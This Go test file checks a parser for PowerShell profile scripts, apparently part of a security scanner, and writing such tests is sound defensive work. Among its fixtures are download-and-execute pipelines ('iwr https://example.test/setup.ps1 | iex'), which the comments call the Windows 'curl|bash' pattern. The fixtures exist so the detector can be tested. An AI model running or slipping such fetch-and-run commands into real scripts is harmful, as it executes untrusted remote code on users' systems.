package parse

import (
	"strings"
	"testing"
	"testing/quick"
)

func TestParsePowerShellProfile_EnvAssignment(t *testing.T) {
	src := `$env:PATH = "C:\Users\X\bin;$env:PATH"
$env:API_KEY = 'sk-aaaa'
$env:WITH_COMMENT = "val"  # trailing comment
`
	p := parsePowerShellProfile([]byte(src))
	if got := p.EnvVars["PATH"]; got != `C:\Users\X\bin;$env:PATH` {
		t.Errorf("$env:PATH = %q", got)
	}
	if got := p.EnvVars["API_KEY"]; got != "sk-aaaa" {
		t.Errorf("$env:API_KEY = %q, want sk-aaaa", got)
	}
	if got := p.EnvVars["WITH_COMMENT"]; got != "val" {
		t.Errorf("$env:WITH_COMMENT = %q, want val (comment stripped)", got)
	}
	if p.EnvVarLines["API_KEY"] != 2 {
		t.Errorf("API_KEY line = %d, want 2", p.EnvVarLines["API_KEY"])
	}
}

func TestParsePowerShellProfile_BareVarAssignment(t *testing.T) {
	src := `$foo = "bar"
$global:baz = 42
$script:helper = 'qux'
`
	p := parsePowerShellProfile([]byte(src))
	if got := p.Vars["foo"]; got != "bar" {
		t.Errorf("$foo = %q, want bar", got)
	}
	// scope prefix should be stripped
	if got := p.Vars["baz"]; got != "42" {
		t.Errorf("$global:baz var key = ? value = %q, want 42", got)
	}
	if got := p.Vars["helper"]; got != "qux" {
		t.Errorf("$script:helper value = %q, want qux", got)
	}
}

func TestParsePowerShellProfile_DotSource(t *testing.T) {
	src := `. ./other.ps1
. C:\Tools\my-profile.ps1
. "C:\Path With Space\inc.ps1"
`
	p := parsePowerShellProfile([]byte(src))
	wantSources := []string{
		"./other.ps1",
		`C:\Tools\my-profile.ps1`,
		`C:\Path With Space\inc.ps1`,
	}
	if len(p.Sources) != len(wantSources) {
		t.Fatalf("Sources = %v, want %v", p.Sources, wantSources)
	}
	for i, s := range wantSources {
		if p.Sources[i] != s {
			t.Errorf("Sources[%d] = %q, want %q", i, p.Sources[i], s)
		}
	}
}

func TestParsePowerShellProfile_ImportModule(t *testing.T) {
	src := `Import-Module posh-git
Import-Module -Name PSReadLine
Add-PSSnapin Microsoft.Foo
using module C:\modules\my.psm1
`
	p := parsePowerShellProfile([]byte(src))
	want := []string{"posh-git", "PSReadLine", "Microsoft.Foo", `C:\modules\my.psm1`}
	if len(p.Modules) != len(want) {
		t.Fatalf("Modules = %v, want %v", p.Modules, want)
	}
	for i, m := range want {
		if p.Modules[i] != m {
			t.Errorf("Modules[%d] = %q, want %q", i, p.Modules[i], m)
		}
	}
}

func TestParsePowerShellProfile_Aliases(t *testing.T) {
	src := `Set-Alias ll Get-ChildItem
New-Alias -Name g -Value git
Set-Alias -Name k -Value kubectl
New-Alias touch New-Item
`
	p := parsePowerShellProfile([]byte(src))
	want := map[string]string{
		"ll":    "Get-ChildItem",
		"g":     "git",
		"k":     "kubectl",
		"touch": "New-Item",
	}
	if len(p.Aliases) != len(want) {
		t.Fatalf("Aliases = %v, want %v", p.Aliases, want)
	}
	for k, v := range want {
		if p.Aliases[k] != v {
			t.Errorf("Aliases[%q] = %q, want %q", k, p.Aliases[k], v)
		}
	}
}

// TestParsePowerShellProfile_PipelineIWRIEX: the security-relevant
// case rules will use most. `Invoke-WebRequest <url> | Invoke-
// Expression` is the canonical "curl|bash" pattern on Windows. Make
// sure the splitter picks it up.
func TestParsePowerShellProfile_PipelineIWRIEX(t *testing.T) {
	src := `iwr https://example.test/setup.ps1 | iex
$response = Invoke-WebRequest "https://x.test/script.ps1"
Get-Process | Where-Object Name -EQ powershell | Stop-Process
`
	p := parsePowerShellProfile([]byte(src))
	if len(p.Pipelines) != 2 {
		t.Fatalf("pipelines = %d, want 2", len(p.Pipelines))
	}
	if !strings.Contains(p.Pipelines[0].Stages[0], "iwr") ||
		!strings.Contains(p.Pipelines[0].Stages[1], "iex") {
		t.Errorf("pipeline 1 stages = %v, want iwr → iex", p.Pipelines[0].Stages)
	}
	if len(p.Pipelines[1].Stages) != 3 {
		t.Errorf("pipeline 2 stages = %v, want 3 stages", p.Pipelines[1].Stages)
	}
}

// TestParsePowerShellProfile_NoFalsePipelineFromLogicalOr: PowerShell
// 7+ supports `||` as logical-or. We MUST NOT split on it.
func TestParsePowerShellProfile_NoFalsePipelineFromLogicalOr(t *testing.T) {
	src := `git pull || git stash
`
	p := parsePowerShellProfile([]byte(src))
	if len(p.Pipelines) != 0 {
		t.Errorf("expected no pipelines for `||` line, got %d: %v", len(p.Pipelines), p.Pipelines)
	}
}

// TestParsePowerShellProfile_NoFalsePipelineInsideQuotes: a literal
// pipe inside a string MUST NOT split.
func TestParsePowerShellProfile_NoFalsePipelineInsideQuotes(t *testing.T) {
	src := `$msg = "use | as separator"
$x = 'a|b|c'
`
	p := parsePowerShellProfile([]byte(src))
	if len(p.Pipelines) != 0 {
		t.Errorf("pipes inside quotes should not split: %d pipelines, %v", len(p.Pipelines), p.Pipelines)
	}
}

// TestParsePowerShellProfile_BacktickContinuation: trailing backtick
// continues onto the next line. Rules see one logical statement.
func TestParsePowerShellProfile_BacktickContinuation(t *testing.T) {
	src := "$env:LONG_KEY = `\n    \"value-on-next-line\"\n"
	p := parsePowerShellProfile([]byte(src))
	if got := p.EnvVars["LONG_KEY"]; got != "value-on-next-line" {
		t.Errorf("$env:LONG_KEY = %q, want value-on-next-line", got)
	}
}

// TestParsePowerShellProfile_CommentLines: # comments and block-
// comment OPENs at line start are ignored; mid-line comments after a
// space are trimmed.
func TestParsePowerShellProfile_CommentLines(t *testing.T) {
	src := `# whole-line comment
$env:KEEP = "value"
$env:TRIM = "v" # trailing comment
`
	p := parsePowerShellProfile([]byte(src))
	if _, ok := p.EnvVars["comment"]; ok {
		t.Errorf("commented line accidentally parsed")
	}
	if p.EnvVars["KEEP"] != "value" {
		t.Errorf("KEEP = %q", p.EnvVars["KEEP"])
	}
	if p.EnvVars["TRIM"] != "v" {
		t.Errorf("TRIM = %q, want v (trailing # comment trimmed)", p.EnvVars["TRIM"])
	}
}

// TestParsePowerShellProfile_MalformedTolerated: garbage input must
// not panic. The parser emits parse-error findings via Document at
// the caller layer, but parsePowerShellProfile itself never crashes.
func TestParsePowerShellProfile_MalformedTolerated(t *testing.T) {
	srcs := []string{
		"",
		"\x00\x01\x02",
		"$",
		"$env",
		"$env:",
		"$env: = ",
		"|||||",
		"' \" ' \" '",
		"`\n`\n`\n",
		"Import-Module",
		"Set-Alias",
		strings.Repeat("a", 100000),
	}
	for _, s := range srcs {
		// Must not panic.
		_ = parsePowerShellProfile([]byte(s))
	}
}

// FuzzParsePowerShellProfile feeds random byte sequences through the
// parser. Per the v1 design ("Fuzz harness on shellrc + YAML parsers
// using Go's built-in testing.F"), the PowerShell parser carries the
// same regression contract: never panic, always return a non-nil
// result.
//
// Run with: go test -fuzz=FuzzParsePowerShellProfile ./internal/parse/
func FuzzParsePowerShellProfile(f *testing.F) {
	seeds := []string{
		`$env:PATH = "C:\bin"`,
		`. ./other.ps1`,
		`iwr https://x.test | iex`,
		`Set-Alias ll Get-ChildItem`,
		"$x = `\n    42\n",
		`'unterminated`,
		`"unterminated`,
		"$\x00env:KEY = \"v\"",
	}
	for _, s := range seeds {
		f.Add([]byte(s))
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		p := parsePowerShellProfile(data)
		if p == nil {
			t.Fatalf("parsePowerShellProfile returned nil for input %q", data)
		}
	})
}

// quick.Check anchor: same property, just via testing/quick so it
// runs at the regular -count=1 cadence without -fuzz.
func TestParsePowerShellProfile_NeverPanicsQuick(t *testing.T) {
	prop := func(data []byte) bool {
		return parsePowerShellProfile(data) != nil
	}
	cfg := &quick.Config{MaxCount: 200}
	if err := quick.Check(prop, cfg); err != nil {
		t.Fatalf("quick.Check: %v", err)
	}
}
